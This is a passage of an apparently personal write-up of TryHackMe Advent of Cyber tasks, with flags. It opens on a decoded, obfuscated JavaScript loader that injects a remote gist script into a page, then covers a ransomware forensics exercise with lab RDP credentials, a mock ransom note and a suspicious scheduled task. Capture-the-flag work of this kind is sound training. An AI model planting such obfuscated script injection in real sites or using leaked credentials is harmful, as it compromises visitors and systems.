number">53</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">54</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">41</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">41</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">62</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">45</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">49</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">41</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">123</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">110</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">51</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">61</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">102</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">97</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">108</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">115</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">59</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">125</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">125</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">105</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">102</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">110</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">51</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">61</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">61</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">114</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">117</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">41</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">123</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">100</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">111</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">99</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">117</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">109</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">110</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">46</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">103</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">69</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">108</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">109</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">110</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">115</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">66</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">121</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">84</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">97</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">103</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">78</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">97</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">109</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">34</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">104</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">97</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">100</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">34</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">41</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">91</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">48</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">93</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">46</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">97</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">112</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">112</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">110</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">100</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">67</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">104</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">105</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">108</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">100</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">115</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">111</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">109</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">115</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">114</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">105</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">110</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">103</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">41</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">59</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">125</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we run it in the browser console, we get the following:</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;script type=​&quot;text/​javascript&quot; async src=​&quot;hhttps:​/​/​gist.github.com/​heavenraiza/​&quot;&gt;</span><span class="token script language-javascript">​</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain">​</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Looks like they made a typo, but if we go to <code>https:​/​/​gist.github.com/​heavenraiza/</code>, we can find the final flag!</p><p>Flag: <code>THM{657012dcf3d1318dca0ed864f0e70535}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-23-the-grinch-strikes-again">Day 23: The Grinch strikes again<a href="#day-23-the-grinch-strikes-again" class="hash-link" aria-label="Direct link to Day 23: The Grinch strikes again" title="Direct link to Day 23: The Grinch strikes again">​</a></h2><p><em>Category: Blue Teaming</em><br>
<em>Tags: Volume shadow copy service, Windows forensics</em></p><blockquote><p>As the day draws near the Grinch is desperate. He used his secret weapon and launched a ransomware attack crippling the endpoints. Understand what is VSS and how it is used to recover files on the endpoint.</p></blockquote><p>IP: <code>10.10.71.169</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-via-rdp-1">Connecting via RDP<a href="#connecting-via-rdp-1" class="hash-link" aria-label="Direct link to Connecting via RDP" title="Direct link to Connecting via RDP">​</a></h3><p>Once again, I used Microsoft Remote Desktop to connect. This time the credentials are: <code>administrator:sn0wF!akes!!!</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="reading-the-ransomnote">Reading the ransomnote<a href="#reading-the-ransomnote" class="hash-link" aria-label="Direct link to Reading the ransomnote" title="Direct link to Reading the ransomnote">​</a></h3><p>If we open the ransomnote, we find the following message.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">As you were calmly looking at your documents I encrypted all the workstations at Best Festival Company just now. Including yours McEager! Send me lots and lots of money to my bitcoin address (bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==) and MAYBE I&#x27;ll give you the key to decrypt. &gt;:^p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The bitcoin address something in base64. We can try to decode it.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day23-the-grinch-strikes-again$ echo &quot;bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==&quot; | base64 -d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nomorebestfestivalcompany</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="looking-at-the-encrypted-files">Looking at the encrypted files<a href="#looking-at-the-encrypted-files" class="hash-link" aria-label="Direct link to Looking at the encrypted files" title="Direct link to Looking at the encrypted files">​</a></h3><p>First we assign a letter to all of the dirves so that we can view them in the Windows explorer.
<img loading="lazy" alt="screenshot" src="/assets/images/disk_management-87722e91028e7146b464d6ee61b1890d.png" width="1290" height="604" class="img_ev3q"></p><p>I took a look at the Backup drive first.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/backup-dfc157a3c5a19eba40d0099c05b2ae43.png" width="1127" height="292" class="img_ev3q"></p><p>The database folder contains an empty txt file.</p><p>The vStockings folder seems more interesting as it contains some encrypted files.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/elf1-6029e545760ed4eb36b5059fc9c3cde0.png" width="906" height="130" class="img_ev3q">
<img loading="lazy" alt="screenshot" src="/assets/images/elf2-aa6d9d71c593261149480ddc0ad5f030.png" width="906" height="136" class="img_ev3q">
<img loading="lazy" alt="screenshot" src="/assets/images/elf3-0b8207b5d7605af7950abeb7fbefdd28.png" width="907" height="148" class="img_ev3q"></p><p>It seems like the encrypted files have a <code>.grinch</code> extension.</p><p>Lastly, there is a confidential folder which is hidden. Inside, there is the <code>master-password.txt.grinch</code> file. However, it is not encrypted so we can see that his password is <code>m33pa55w0rdIZseecure!</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="looking-through-the-scheduled-tasks">Looking through the scheduled tasks<a href="#looking-through-the-scheduled-tasks" class="hash-link" aria-label="Direct link to Looking through the scheduled tasks" title="Direct link to Looking through the scheduled tasks">​</a></h3><p>We can also take a look through the scheduled tasks. Looking through them, the <code>opidsfsdf</code> task looks quite suspicious. It seems to be running whenever the Administrator user logs in.
<img loading="lazy" alt="screenshot" src="/assets/images/tasks-b72c90d4cc74fb6ef0c11d09bdb9c355.png" width="1154" height="278" class="img_ev3q"></p><p>Let&#x27;s collect more information!</p><p>It seems like it starts to run an executable file at <code>C:\Users\Administrator\Desktop\opidsfsdf.exe</code></p><p><img loading="lazy" alt="screenshot" src="data:image/png;base64,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